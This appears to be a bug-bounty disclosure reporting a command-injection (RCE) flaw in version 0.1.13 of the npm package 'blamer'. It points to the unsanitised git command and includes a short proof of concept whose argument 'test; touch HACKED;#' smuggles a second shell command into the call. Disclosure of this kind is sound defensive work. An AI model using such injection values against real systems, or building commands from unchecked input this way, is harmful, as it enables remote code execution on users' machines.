## Details
I would like to report a `RCE` issue in the `blamer` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `blamer`
**version:** `0.1.13`
**npm page:** `https://www.npmjs.com/package/blamer`

## Module Description
> Blamer is a tool for get information about author of code from version control system. Supports git and subversion.

## Module Stats
[~1800] downloads in the last day
[12,910] downloads in the last week
[~52k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/kucherenko/blamer/blob/master/src/vcs/git.js#L24

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var Blamer = require('blamer');
var blamer = new Blamer('git');
blamer.blameByFile('poc.js', 'test; touch HACKED;#');

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i blamer # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F681902}
